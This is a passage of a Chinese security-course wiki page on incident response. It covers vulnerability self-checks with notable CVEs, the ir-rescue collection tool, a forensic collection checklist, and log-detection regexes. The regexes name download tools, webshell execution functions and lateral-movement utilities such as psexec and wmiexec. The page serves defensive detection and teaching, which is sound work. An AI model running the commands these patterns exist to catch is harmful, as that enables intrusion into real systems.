> 交叉验证：[[linux-kernel-hardening-mechanisms]] 了解缓解措施对利用链的影响，[[race-condition-vulnerability-analysis]] 关注竞争条件类提权。

### 服务/中间件漏洞自查流程

1. **资产清单获取**
   - Windows：`Get-WmiObject -class Win32_Product`、注册表 `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall`
   - Linux：`dpkg -l` / `rpm -qa`、进程端口 `ss -antlp`、systemd `systemctl list-units --type=service`
2. **漏洞检索**：
   - `searchsploit <service_name> [--cve CVE-ID]` 离线 Exploit-DB
   - 在线：CVE Details、NVD、CNNVD、CNVD、漏洞库平台（奇安信/360/阿里云/腾讯云）
   - 关注：WebLogic (CVE-2020-14882/CVE-2019-2725)、Tomcat (CVE-2020-1938 AJP)、Struts2 (S2-057/S2-059)、Jenkins (CVE-2024-23897)、Exchange (ProxyLogon/ProxyShell)、FortiSSL VPN (CVE-2018-13379)、Log4j2 (CVE-2021-44228)
3. **验证与修复**：搭建隔离环境复现 → 评估影响面 → 补丁/配置加固/虚拟补丁(WAF/RASP) → 回归测试

### 自动化应急工具箱：ir-rescue

**GitHub**：<https://github.com/diogo-fernan/ir-rescue>

- **定位**：跨平台（Windows/Linux/macOS）应急响应证据采集自动化框架
- **核心模块**：
  - `ir-rescue.exe` / `ir-rescue`：交互式菜单，按类别采集（易失性/非易失性/全量）
  - 支持输出：JSON/CSV/Bodyfile (TSK) / 摘要报告
  - 集成工具：`Volatility`/`Rekall` (内存)、`KAPE`/`MFTECmd`/`EvtxECmd`/`AppCompatCacheParser`/`RegistryExplorer`/`AmcacheParser`/`SrumECmd` (Windows 制品)、`log2timeline`/`Plaso` (超级时间线)
- **实战模式**：
  - 快速分级：`ir-rescue --triage` (仅易失性数据，<5min)
  - 全量取证：`ir-rescue --full` (含磁盘镜像、内存镜像、注册表、事件日志、MFT、USN Journal、Prefetch、Shimcache、Amcache、SRUM、WMI、Tasks、LNK/JumpList、浏览器历史记录、邮件、容器/虚拟机镜像)
  - 自定义：`ir-rescue --config custom.yaml` 适配合规基线

> 配合 [[cybersecurity-interview-guide-2022]] 应急响应面试题库，构建“工具+流程+实战”三位一体能力模型。

---

## 六、知识图谱与交叉引用总览

```mermaid
graph TD
    A[Day71 隧道技术] --> B[Day72 C2联动与Web溯源]
    A --> C[Day73 应急响应流程]
    B --> D[CS<->MSF 会话移交]
    B --> E[Web攻击溯源实战]
    B --> F[攻击溯源方法论体系]
    C --> G[Day74 OS入侵排查]
    C --> H[Day75 第三方应用与自查]
    D --> I[[internal-network-pivoting-techniques]]
    D --> J[[cobalt-strike-external-c2-smb-beacon]]
    E --> K[[php-webshell-fundamentals-chopper-analysis]]
    E --> L[[php-webshell-obfuscation-av-evasion]]
    E --> M[[named-pipe-smb-detection-sysmon]]
    F --> N[[threat-attribution-tracing-techniques]]
    F --> O[[phishing-website-creation-tutorial]]
    F --> P[[android-shelling-unshelling-techniques]]
    F --> Q[[pe-import-table-internals]]
    F --> R[[phantom-dll-hollowing-technique]]
    F --> S[[c2-redirectors-malleable-c2-profiles]]
    F --> T[[smb-named-pipe-c2-communication]]
    G --> U[暴力破解溯源 RDP/SSH]
    G --> V[后门排查 Webshell/PC木马/CrossC2]
    G --> W[勒索病毒处置 WannaCry]
    H --> X[LogonTracer 图谱溯源]
    H --> Y[数据库审计 MySQL/MSSQL/Oracle]
    H --> Z[漏洞自查 WindowsVulnScan/LES/LinEnum]
    H --> AA[应急工具箱 ir-rescue]
```



### 核心技术页面索引

| 领域 | 代表页面 | 关键词 |
|------|----------|--------|
| **Web 攻防基础** | [[xd-security-pentest-basic-stage-notes]]、[[attack-defense-world-beginner-web-writeup]]、[[pikachu-target-writeup-part1-setup-brute-force]] | SQLi、XSS、文件上传、RCE、SSRF、反序列化 |
| **Web 进阶实战** | [[attack-defense-world-master-advanced-writeup]]、[[buuctf-web-writeup-collection]]、[[gkctf-2021-web-writeup]] | ThinkPHP5、Java反序列化、Node.js原型链污染、SSTI、Git泄露 |
| **内网渗透与 C2** | [[internal-network-pivoting-techniques]]、[[cobalt-strike-external-c2-smb-beacon]]、[[covenant-c2-framework-analysis]]、[[c2-redirectors-malleable-c2-profiles]] | SMB Beacon、HTTP/SMB/DNS 隧道、重定向器、Malleable Profile |
| **Windows 内核与凭证** | [[windows-syscall-internals-sysenter-kifastcallentry]]、[[mimikatz-source-code-architecture-golden-ticket-audit]]、[[lm-ntlm-hash-generation-analysis]]、[[pe-manual-mapping-loader-implementation]] | 系统调用、Kerberos、NTLM、手动映射、模块隐藏 |
| **Linux 提权与内核** | [[linux-kernel-hardening-mechanisms]]、[[heap-overflow-principles-unlink-exploitation]]、[[rop-linux-x86-beginner-tutorial]] | 缓解措施、堆利用、ROP、内核漏洞 |
| **二进制逆向与混淆** | [[binary-ninja-ollvm-deobfuscation]]、[[ida-pro-tips-plugins-python]]、[[android-shelling-unshelling-techniques]]、[[game-reverse-engineering-course-materials]] | OLLVM去平坦化、FLIRT签名、Android加固脱壳、游戏逆向 |
| **CTF 实战库** | [[buuctf-pwn-writeup-collection]]、[[mtctf-2021-pwn-writeup]]、[[xihulunjian-2020-iot-pwn3-ezarmpwn-writeup]]、[[d3ctf-2021-d3dev-qemu-escape-writeup]]、[[google-ctf-2021-full-chain-v8-exploitation]] | PWN、IoT、VM Escape、V8 JIT、浏览器利用链 |
| **硬件与无线** | [[0w1club-hardware-atlas]]、[[badusb-hid-attack-arduino-leonardo]]、[[0w1club-week2-wifi-hijacking-arp-spoofing]]、[[ettercap-arp-mitm-practical-guide]] | Proxmark3、Ubertooth、BadUSB、ARP欺骗、中间人攻击 |
| **密码学与编码** | [[crypto-basics-xor-stream-cipher-tutorial]]、[[jwt漏洞原理与实战利用]]、[[0w1club-training-shellshock-cgi-exploitation]] | XOR/流密码、JWT算法混淆、Shellshock、Dirty COW |
| **溯源取证专题** | [[threat-attribution-tracing-techniques]]、[[xd-security-blue-team-defense]]、[[xd-security-awd-competition-strategies]] | 威胁溯源、攻击归因、数字取证、蓝队防御、AWD实战 |

---

## 七、实战清单速查表

### 应急响应现场取证清单（前 30 分钟）

| 优先级 | 数据源 | 采集命令/工具 | 保存路径建议 |
|--------|--------|---------------|--------------|
| P0 | 内存镜像 | `winpmem_mini_x64_rc2.exe -o memory.raw` / `LiME.ko` | `/evidence/memory/` |
| P0 | 网络连接 | `netstat -ano` / `ss -antlp` / `Get-NetTCPConnection` | `/evidence/volatile/netstat.txt` |
| P0 | 进程列表 | `tasklist /v` / `ps auxww` / `Get-Process \| fl *` | `/evidence/volatile/process.txt` |
| P0 | 登录会话 | `query user` / `who` / `w` / `Get-CimInstance Win32_LoggedOnUser` | `/evidence/volatile/session.txt` |
| P0 | 计划任务 | `schtasks /query /fo LIST /v` / `crontab -l` / `systemctl list-timers` | `/evidence/volatile/tasks.txt` |
| P0 | 启动项/服务 | `wmic startup get caption,command` / `systemctl list-unit-files --state=enabled` / `autorunsc.exe -accepteula -a *` | `/evidence/volatile/startup.txt` |
| P1 | 安全日志 | `wevtutil epl Security security.evtx` / `cp /var/log/secure /evidence/logs/` | `/evidence/logs/` |
| P1 | 系统/应用日志 | `wevtutil epl System system.evtx` / `cp /var/log/syslog /evidence/logs/` | `/evidence/logs/` |
| P1 | 注册表关键键值 | `reg export HKLM\SYSTEM\CurrentControlSet\Services system_services.reg` / `reg export HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run run.reg` | `/evidence/registry/` |
| P1 | MFT / USN Journal | `MFTECmd.exe -f C:\$MFT --csv ./mft.csv` / `USNParser.exe -f C:\$Extend\$UsnJrnl:$J` | `/evidence/filesystem/` |
| P2 | 浏览器/邮件制品 | `BrowserHistoryView.exe` / `NirSoft` 套件 | `/evidence/user/` |
| P2 | 容器/虚拟机镜像 | `docker save` / `virsh snapshot-create-as` | `/evidence/vm/` |

### 日志分析常用正则/关键词库

```text
# Web 攻击通用
(\bunion\b.*\bselect\b)|(\bselect\b.*\bunion\b)|(\binsert\b.*\binto\b)|(\bupdate\b.*\bset\b)|(\bdelete\b.*\bfrom\b)|(\bdrop\b.*\btable\b)|(\bcreate\b.*\btable\b)|(\balter\b.*\btable\b)|(\bexec\b|\bexecute\b)|(\bxp_cmdshell\b)|(\bsp_oacreate\b)|(\bload_file\b)|(\binto\s+outfile\b)|(\bbase64\b)|(\beval\b|\bassert\b|\bsystem\b|\bpassthru\b|\bshell_exec\b|\bproc_open\b|\bpopen\b|\bcurl_exec\b)|(\bchmod\b|\bchown\b)|(\bwget\b|\bcurl\b|\bcertutil\b|\bbitsadmin\b|\bpowershell\b|\bcmd\.exe\b)

# 弱口令/爆破
Failed password|Authentication failure|Invalid user|Connection closed by authenticating user|error: PAM:|error: Failed to allocate internet-domain X11 display socket

# Webshell 行为
POST.*\.php.*eval|POST.*\.jsp.*Runtime\.getRuntime|POST.*\.asp.*execute|POST.*\.aspx.*Process\.Start|Content-Type:.*application/octet-stream.*filename=.*\.(php|jsp|asp|aspx)

# 勒索病毒
\.wncry|\.locked|\.encrypted|\.crypted|\.crypt|\.locked|\.rsa|\.aes|@Please_Read_Me@|README_DECRYPT|DECRYPT_INSTRUCTION|HOW_TO_DECRYPT|_readme\.txt|\.onion

# 横向移动
psexec|wmic|winrs|winrm|sc create|schtasks /create|at \\\\|reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|Invoke-Command|Enter-PSSession|New-PSSession|Copy-Item -ToSession|smbexec|wmiexec|atexec|dcomexec

# 溯源关键词 (IP/域名/邮箱/样本哈希)
\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b|[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|[a-fA-F0-9]{32}|[a-fA-F0-9]{40}|[a-fA-F0-9]{64}
```

---

## 八、持续更新与贡献指南

1. **版本控制**：本页面随 XD安全课程进度与社区工具迭代持续更新，建议每季度复核工具版本（GScan/ir-rescue/LogonTracer/LES/LinEnum/WindowsVulnScan）
2. **实战反馈**：实战中遇到新攻击变种、新工具指纹、新日志字段，请通过 Issue/PR 补充至对应章节
3. **交叉引用维护**：新增技术页面时，在“知识图谱与交叉引用导航”表格中同步添加，保持图谱完整性
4. **合规提醒**：所有技术仅限授权环境下的防御、溯源、演练使用，严禁用于未授权渗透测试或恶意攻击

---

> **页面定位**：本页面作为 XD安全渗透测试课程 **内网渗透与应急响应模块** 的结构化知识沉淀，兼顾“流程标准化”、“技术细节落地”、“工具链工程化”、“溯源归因方法论”四个维度，配合全站 100+ 技术页面形成可检索、可复用、可进化的安全知识库。

## 来源

- [0x00实验室-202108-202304_111](../sources/0x00实验室-202108-202304_111.md)
